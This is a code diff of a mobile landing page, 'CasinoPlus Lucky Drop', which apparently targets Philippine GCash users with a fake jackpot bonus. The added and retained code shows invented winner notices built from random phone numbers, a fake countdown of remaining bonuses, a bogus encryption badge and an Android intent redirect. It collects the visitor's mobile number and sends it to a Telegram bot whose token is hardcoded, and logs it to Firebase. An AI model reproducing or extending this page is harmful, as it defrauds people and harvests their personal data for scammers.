@@ -3,132 +3,438 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CasinoPlus | Lucky Drop</title>
+    <title>CasinoPlus | Lucky Drop — Premium Access</title>
     
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
 
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;900&display=swap" rel="stylesheet">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,500;14..32,700;14..32,800&family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%); --dark-bg: #060a13; }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
-        body { 
-            background-color: var(--dark-bg); 
-            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, #060a13 100%); 
-            color: #fff; 
-            font-family: 'Public Sans', sans-serif; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            overflow: hidden; 
-            flex-direction: column;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        /* LIVE WINNERS TICKER */
-        .live-winner-box { position: absolute; top: 20px; background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); animation: fadeInOut 3s infinite; z-index: 100; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
-        .gc-mini-icon { width: 14px; height: 14px; vertical-align: middle; margin: 0 2px; object-fit: contain; }
+        :root {
+            --gold: linear-gradient(135deg, #F5E18B 0%, #D4AF37 50%, #B8860B 100%);
+            --gold-solid: #D4AF37;
+            --dark: #0B0F1C;
+            --glass: rgba(15, 25, 45, 0.65);
+            --border-glow: rgba(212, 175, 55, 0.4);
+            --shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        }
 
-        @keyframes fadeInOut { 0% { opacity: 0; transform: translateY(-15px); } 10% { opacity: 1; transform: translateY(0); } 90% { opacity: 1; } 100% { opacity: 0; } }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        body {
+            background: radial-gradient(ellipse at 30% 40%, #0A0F1E, #03050A);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
 
-        /* MAIN CARD */
-        .card { width: 92%; max-width: 380px; background: rgba(255, 255, 255, 0.05); border: 2px solid rgba(212, 175, 55, 0.5); border-radius: 28px; padding: 35px 24px; backdrop-filter: blur(20px); text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden; }
-        .card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.08) 50%, rgba(255,255,255,0) 100%); transform: rotate(30deg); animation: shimmer 4s infinite; pointer-events: none; }
-        @keyframes shimmer { 0% { transform: translateX(-100%) rotate(30deg); } 100% { transform: translateX(100%) rotate(30deg); } }
+        /* Animated background particles */
+        body::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle at 20% 40%, rgba(212,175,55,0.08) 2%, transparent 2.5%);
+            background-size: 45px 45px;
+            pointer-events: none;
+        }
 
-        .logo-img { width: 170px; margin-bottom: 20px; }
-        h1 { font-size: 26px; font-weight: 900; margin-bottom: 5px; color: #fbbf24; text-shadow: 0 2px 10px rgba(251, 191, 36, 0.3); }
-        .promo-text { color: #cbd5e1; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+        /* Live Ticker */
+        .live-ticker {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(212, 175, 55, 0.4);
+            border-radius: 100px;
+            padding: 8px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 200;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            animation: fadeSlideIn 0.5s ease;
+        }
+        .live-dot {
+            width: 10px;
+            height: 10px;
+            background: #22c55e;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #22c55e;
+            animation: pulseGreen 1.5s infinite;
+        }
+        .live-text {
+            font-size: 12px;
+            font-weight: 500;
+            color: #FFE6A3;
+            letter-spacing: 0.3px;
+        }
+        .gc-icon {
+            width: 16px;
+            height: 16px;
+            vertical-align: middle;
+            margin: 0 3px;
+        }
 
-        /* SCARCITY BAR */
-        .scarcity-box { background: rgba(0,0,0,0.4); padding: 10px; border-radius: 12px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }
-        .scarcity-text { font-size: 12px; color: #fbbf24; font-weight: 700; margin-bottom: 5px; display: flex; justify-content: space-between; }
-        .progress-bg { width: 100%; height: 6px; background: #334155; border-radius: 5px; overflow: hidden; }
-        .progress-bar { width: 85%; height: 100%; background: var(--gold); border-radius: 5px; transition: width 0.5s ease-in-out; }
+        /* Main Card */
+        .hero-card {
+            max-width: 440px;
+            width: 100%;
+            background: var(--glass);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border-glow);
+            border-radius: 56px;
+            padding: 32px 28px 42px;
+            box-shadow: var(--shadow), 0 0 0 1px rgba(212,175,55,0.1) inset;
+            transition: transform 0.3s ease;
+            position: relative;
+            z-index: 10;
+        }
 
-        /* BUTTON */
-        .btn-main { background: var(--gold); color: #000; border: none; width: 100%; padding: 20px; border-radius: 16px; font-size: 16px; font-weight: 900; text-transform: uppercase; cursor: pointer; box-shadow: 0 6px 0 #8b6508; animation: btnPulse 2s infinite; }
-        .btn-main:active { transform: translateY(3px); box-shadow: 0 3px 0 #8b6508; }
-        .btn-main:disabled { background: #334155; box-shadow: none; color: #64748b; animation: none; cursor: not-allowed; }
-        @keyframes btnPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
+        /* Gold shimmer border effect */
+        .hero-card::after {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: 56px;
+            padding: 1px;
+            background: linear-gradient(125deg, rgba(212,175,55,0), var(--gold-solid), rgba(212,175,55,0));
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            opacity: 0.5;
+            pointer-events: none;
+        }
 
-        /* MODAL */
-        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.95); z-index: 99999; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .modal-content { width: 92%; max-width: 380px; background: #0f172a; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); overflow: hidden; text-align: center; }
-        .promo-banner { width: 100%; height: 200px; object-fit: contain; background: #000; border-bottom: 2px solid #d4af37; padding: 10px; }
-        .modal-body { padding: 25px 20px; }
-        input { width: 100%; background: #000; border: 1px solid #334155; border-radius: 15px; padding: 18px; color: #fff; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 15px; outline: none; }
-        .trust-badge { font-size: 11px; color: #64748b; margin-top: 15px; }
+        .logo {
+            width: 150px;
+            margin: 0 auto 20px;
+            display: block;
+            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.4));
+        }
+
+        h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 28px;
+            font-weight: 800;
+            background: var(--gold);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-align: center;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+        }
+
+        .subhead {
+            text-align: center;
+            color: #B9C7D9;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.45;
+            margin-bottom: 28px;
+            background: rgba(0,0,0,0.3);
+            padding: 8px 15px;
+            border-radius: 60px;
+            backdrop-filter: blur(4px);
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .subhead b {
+            color: var(--gold-solid);
+            font-weight: 700;
+        }
+
+        /* Scarcity / Supply Meter */
+        .supply-panel {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 28px;
+            padding: 16px 18px;
+            margin-bottom: 28px;
+            border: 1px solid rgba(255,215,0,0.2);
+        }
+        .supply-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #FFDE9E;
+        }
+        .progress-track {
+            background: #1E2A3A;
+            border-radius: 30px;
+            height: 8px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 88%;
+            height: 100%;
+            background: var(--gold);
+            border-radius: 30px;
+            box-shadow: 0 0 6px #D4AF37;
+            transition: width 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        /* CTA Button */
+        .cta-button {
+            background: var(--gold);
+            border: none;
+            width: 100%;
+            padding: 18px 10px;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 18px;
+            text-transform: uppercase;
+            color: #0B0F1C;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 0 #7A5C1A;
+            font-family: inherit;
+            letter-spacing: 1px;
+        }
+        .cta-button:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #7A5C1A;
+        }
+        .cta-button:disabled {
+            opacity: 0.6;
+            transform: none;
+            cursor: not-allowed;
+            background: #4A5B6E;
+            box-shadow: none;
+        }
+
+        /* Modal Premium */
+        .modal-premium {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(24px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal-card {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(12, 18, 28, 0.95);
+            border-radius: 56px;
+            border: 1px solid rgba(212,175,55,0.5);
+            overflow: hidden;
+            box-shadow: 0 30px 40px rgba(0,0,0,0.6);
+            animation: modalPop 0.4s ease;
+        }
+        .modal-banner {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            background: #000;
+            border-bottom: 2px solid #D4AF37;
+        }
+        .modal-body {
+            padding: 28px 24px 32px;
+            text-align: center;
+        }
+        .modal-body h2 {
+            color: var(--gold-solid);
+            font-weight: 800;
+            font-size: 26px;
+            margin-bottom: 8px;
+        }
+        .modal-body p {
+            color: #9AAEC2;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .phone-input {
+            width: 100%;
+            background: #010101;
+            border: 1px solid #334155;
+            border-radius: 48px;
+            padding: 18px 20px;
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            color: #fff;
+            letter-spacing: 1px;
+            margin-bottom: 18px;
+            outline: none;
+            transition: 0.2s;
+        }
+        .phone-input:focus {
+            border-color: var(--gold-solid);
+            box-shadow: 0 0 12px rgba(212,175,55,0.4);
+        }
+        .trust-badge {
+            font-size: 11px;
+            color: #5E6F8D;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 18px;
+        }
+
+        /* Blocked state */
+        .blocked-state .hero-card {
+            opacity: 0.25;
+            pointer-events: none;
+            filter: grayscale(0.2);
+        }
+
+        @keyframes fadeSlideIn {
+            from { opacity: 0; transform: translate(-50%, -20px); }
+            to { opacity: 1; transform: translate(-50%, 0); }
+        }
+        @keyframes modalPop {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        @keyframes pulseGreen {
+            0% { opacity: 1; transform: scale(1);}
+            50% { opacity: 0.5; transform: scale(1.1);}
+            100% { opacity: 1; transform: scale(1);}
+        }
+        @keyframes subtleGlow {
+            0% { border-color: rgba(212,175,55,0.3); box-shadow: 0 0 0 0 rgba(212,175,55,0.2);}
+            100% { border-color: rgba(212,175,55,0.7); box-shadow: 0 0 20px 0 rgba(212,175,55,0.3);}
+        }
+        .hero-card:hover {
+            animation: subtleGlow 2s infinite alternate;
+        }
     </style>
 </head>
 <body>
 
-    <div class="live-winner-box" id="winnerBox">
-        <div class="dot"></div>
-        <span id="winnerEntry">Welcome to CasinoPlus Lucky Drop!</span>
+    <!-- Live Ticker -->
+    <div class="live-ticker" id="winnerTicker">
+        <div class="live-dot"></div>
+        <span class="live-text" id="winnerEntry">✨ Welcome to CasinoPlus Lucky Drop ✨</span>
     </div>
 
-    <div class="card" id="mainCard">
-        <img src="images/image-7.jpg" class="logo-img">
-        <h1>JACKPOT DROP!</h1>
-        <p class="promo-text">Your IP address is selected for today's <b>Exclusive Payout Bonus</b>.</p>
+    <!-- Hero Card -->
+    <div class="hero-card" id="mainCard">
+        <img src="images/image-7.jpg" class="logo" alt="CasinoPlus" onerror="this.src='https://placehold.co/200x80?text=CASINO+PLUS'">
+        <h1>JACKPOT DROP</h1>
+        <div class="subhead">🎯 Your IP is selected for today's <b>Exclusive Payout Bonus</b> 🎯</div>
 
-        <div class="scarcity-box">
-            <div class="scarcity-text"><span>Bonuses Remaining:</span><span id="remNum">88/100</span></div>
-            <div class="progress-bg"><div class="progress-bar" id="pBar" style="width: 88%"></div></div>
+        <div class="supply-panel">
+            <div class="supply-header">
+                <span>🔥 Bonuses Remaining</span>
+                <span id="remNum">88/100</span>
+            </div>
+            <div class="progress-track">
+                <div class="progress-fill" id="pBar" style="width: 88%"></div>
+            </div>
         </div>
 
-        <button class="btn-main" onclick="handleVerify()">Check My Reward</button>
+        <button class="cta-button" id="mainCtaBtn" onclick="handleVerify()">⚡ Check My Reward ⚡</button>
     </div>
 
-    <div class="modal-overlay" id="modalOverlay">
-        <div class="modal-content">
-            <img src="images/free_depo.jpeg" class="promo-banner">
+    <!-- Premium Modal -->
+    <div id="modalOverlay" class="modal-premium">
+        <div class="modal-card">
+            <img src="images/free_depo.jpeg" class="modal-banner" alt="Reward" onerror="this.style.display='none'">
             <div class="modal-body" id="modalBodyContent">
-                <h2 style="margin-bottom: 10px; color: #fbbf24;">Claim Your Bonus</h2>
-                <p style="font-size: 12px; color: #94a3b8; margin-bottom: 15px;">Enter your active mobile number to proceed.</p>
-                <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
-                <button class="btn-main" id="claimBtn" onclick="processStep1()">Claim Now</button>
-                <div class="trust-badge">🔒 Secured 256-bit Encryption</div>
+                <h2>🎁 Claim Your Bonus</h2>
+                <p>Enter your active mobile number to unlock your reward.</p>
+                <input type="tel" id="userPhone" class="phone-input" placeholder="09xxxxxxxxx" maxlength="11" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                <button class="cta-button" id="claimModalBtn" onclick="processStep1()">Claim Now</button>
+                <div class="trust-badge">
+                    <span>🔒</span> 256-bit Secured Encryption <span>✅</span>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // 1. Initialize Firebase
+        // ========== FIREBASE INIT ==========
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
 
+        // Helper: block user (claimed / banned)
         function showBlockedUI(reason = "claimed") {
             const overlay = document.getElementById('modalOverlay');
+            const mainCard = document.getElementById('mainCard');
             overlay.style.display = 'flex';
             
-            let blockMessage = "⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.";
-            let title = "RESTRICTED";
-            
-            // Custom message kapag galing sa BAN_PROTOCOL_TERMINAL
+            let title = "⛔ ACCESS RESTRICTED";
+            let message = "⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.";
             if (reason === "banned") {
-                title = "TERMINATED";
-                blockMessage = "⚠️ ACCESS_DENIED: This this number or device is already detect to a successful payout. ";
+                title = "🚫 TERMINATED";
+                message = "⚠️ ACCESS_DENIED: This number or device has already received a successful payout. ";
             }
 
             document.getElementById('modalBodyContent').innerHTML = `
-                <h2 style="color: #ff4d4d; margin-bottom: 15px;">${title}</h2>
-                <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">${blockMessage}</p>
-                <div style="font-size: 50px; margin: 20px 0;">🚫</div>
-                <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff; box-shadow: none; animation: none;" onclick="location.reload()">Device Locked</button>
+                <h2 style="color: #FF5A5A;">${title}</h2>
+                <p style="font-size: 14px; line-height: 1.5;">${message}</p>
+                <div style="font-size: 55px; margin: 15px 0;">🔒</div>
+                <button class="cta-button" style="background: #334155; color: #ccc; box-shadow: none;" onclick="location.reload()">Device Locked</button>
+                <div class="trust-badge" style="margin-top: 20px;">⛔ Permanent restriction</div>
             `;
-            document.getElementById('mainCard').style.opacity = "0.2";
-            document.getElementById('mainCard').style.pointerEvents = "none";
+            mainCard.style.opacity = "0.2";
+            mainCard.style.pointerEvents = "none";
+            document.body.classList.add('blocked-state');
         }
 
+        // Scarcity counter dynamic
+        let remainingCount = 88;
+        const remSpan = document.getElementById('remNum');
+        const progressFill = document.getElementById('pBar');
+        
+        function updateScarcityUI() {
+            if(remSpan) remSpan.innerText = remainingCount + "/100";
+            if(progressFill) progressFill.style.width = remainingCount + "%";
+        }
+        
+        // Simulate diminishing bonus (high-end effect)
+        setInterval(() => {
+            if(remainingCount > 12) {
+                const drop = Math.floor(Math.random() * 3) + 1;
+                remainingCount = Math.max(remainingCount - drop, 12);
+                updateScarcityUI();
+            }
+        }, 6000);
+        
+        // Live ticker (dynamic)
+        function updateTicker() {
+            const prefixes = ["0917","0918","0927","0998","0945","0966","0955","0977"];
+            const rPre = prefixes[Math.floor(Math.random() * prefixes.length)];
+            const rSuf = Math.floor(1000 + Math.random() * 9000);
+            const amounts = [350, 500, 750, 1000, 1250];
+            const amount = amounts[Math.floor(Math.random() * amounts.length)];
+            const entrySpan = document.getElementById('winnerEntry');
+            if(entrySpan) {
+                entrySpan.innerHTML = `🎲 User ${rPre}***${rSuf} just claimed <img src="images/gc_icon.png" class="gc-icon" alt="GCash"> ₱${amount}`;
+            }
+        }
+        setInterval(updateTicker, 3800);
+        updateTicker();
+
+        // Check device lock at start
         window.onload = () => {
             if (localStorage.getItem("cp_device_locked") === "true") {
                 showBlockedUI();
@@ -137,107 +443,88 @@
             }
         };
 
+        // Handle verify (intent / verified)
         function handleVerify() {
             if (localStorage.getItem("cp_device_locked") === "true") return showBlockedUI();
-            const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
+            const rawUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
             if (!window.location.hash.includes("verified")) {
-                window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
+                window.location.href = `intent://${rawUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
             } else {
                 document.getElementById('modalOverlay').style.display = 'flex';
             }
         }
 
-        // --- THE "GHOST" BLOCKER LOGIC ---
+        // MAIN VALIDATION + FIREBASE LOGIC
         async function processStep1() {
             const phone = document.getElementById('userPhone').value.trim();
-            const btn = document.getElementById('claimBtn');
-
-            if (phone.length < 11 || !phone.startsWith('09')) return alert("Enter valid 11-digit number.");
+            const btn = document.getElementById('claimModalBtn');
             
-            btn.disabled = true; 
-            btn.innerHTML = "CHECKING SECURE STATUS...";
-
-            // NEW: STEP 0 - Check muna kung na-ban ang number sa Admin Command Center
+            if (phone.length !== 11 || !phone.startsWith('09')) {
+                alert("📱 Please enter a valid 11-digit mobile number starting with 09.");
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.innerHTML = "🔍 VERIFYING SECURE STATUS...";
+            
+            // 1. Check banned ghosts
             db.ref('banned_ghosts/' + phone).once('value', async (banSnap) => {
                 if (banSnap.exists()) {
                     localStorage.setItem("cp_device_locked", "true");
                     showBlockedUI("banned");
                     return;
                 }
-
-                // A. Check Firebase for "Ghost" (Claimed) status
-                db.ref('user_logs/' + phone).once('value', async (snapshot) => {
-                    const userData = snapshot.val();
-
-                    // B. Kung ang user ay na-mark na as "claimed" sa database, i-block agad
-                    if (userData && userData.status === 'claimed') {
+                
+                // 2. Check if user already claimed (user_logs)
+                db.ref('user_logs/' + phone).once('value', async (logSnap) => {
+                    if (logSnap.exists() && logSnap.val().status === 'claimed') {
                         localStorage.setItem("cp_device_locked", "true");
                         showBlockedUI();
                         return;
                     }
-
-                    // C. Check static blacklist if still exists
-                    const blockedList = window.BLACKLISTED_NUMBERS || [];
-                    if (blockedList.includes(phone)) {
+                    
+                    // 3. (Optional) blacklist array (static)
+                    const blockedStatic = window.BLACKLISTED_NUMBERS || [];
+                    if (blockedStatic.includes(phone)) {
                         localStorage.setItem("cp_device_locked", "true");
                         showBlockedUI();
                         return;
                     }
-
-                    // NEW: Initialize Session para lumabas agad sa GHOST_INTEL_LOGS sa admin
-                    db.ref('user_sessions/' + phone).once('value', s => {
-                        if(!s.exists()) {
-                            db.ref('user_sessions/' + phone).set({
-                                phone: phone,
-                                balance: 0,
-                                clicks: 0,
-                                hasShared: false,
-                                lastUpdate: Date.now()
-                            });
-                        } else {
-                            db.ref('user_sessions/' + phone).update({ lastUpdate: Date.now() });
-                        }
-                    });
-
-                    // D. All clear! Proceed to Telegram and Main
+                    
+                    // 4. Initialize / update user_session (so admin can see ghost)
+                    const userSessionRef = db.ref('user_sessions/' + phone);
+                    const sessionSnap = await userSessionRef.once('value');
+                    if (!sessionSnap.exists()) {
+                        await userSessionRef.set({
+                            phone: phone,
+                            balance: 0,
+                            clicks: 0,
+                            hasShared: false,
+                            lastUpdate: Date.now()
+                        });
+                    } else {
+                        await userSessionRef.update({ lastUpdate: Date.now() });
+                    }
+                    
+                    // 5. All clear → Telegram notification + proceed to main
                     try {
                         localStorage.setItem("userPhone", phone);
                         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
-                        localStorage.setItem("cp_verified", "true");
-                        btn.innerHTML = "SUCCESS...";
-                        setTimeout(() => { window.location.href = "main.html"; }, 1000);
+                        btn.innerHTML = "✅ SUCCESS! REDIRECTING...";
+                        setTimeout(() => {
+                            window.location.href = "main.html";
+                        }, 800);
                     } catch (e) {
                         localStorage.setItem("userPhone", phone);
-                        localStorage.setItem("cp_verified", "true");
                         window.location.href = "main.html";
                     }
                 });
             });
         }
 
-        // Tickers & Progress
-        setInterval(() => {
-            const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
-            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-            const amounts = [350, 500, 750, 1000, 1200];
-            const amount = amounts[Math.floor(Math.random() * amounts.length)];
-            const entry = document.getElementById('winnerEntry');
-            if(entry) {
-                entry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amount}`;
-            }
-        }, 3500);
-
-        let count = 88;
-        setInterval(() => {
-            if(count > 15) {
-                count -= Math.floor(Math.random()*2) + 1;
-                const remNum = document.getElementById('remNum');
-                const pBar = document.getElementById('pBar');
-                if(remNum) remNum.innerText = count + "/100";
-                if(pBar) pBar.style.width = count + "%";
-            }
-        }, 5000);
+        // expose globally
+        window.handleVerify = handleVerify;
+        window.processStep1 = processStep1;
     </script>
 </body>
 </html>
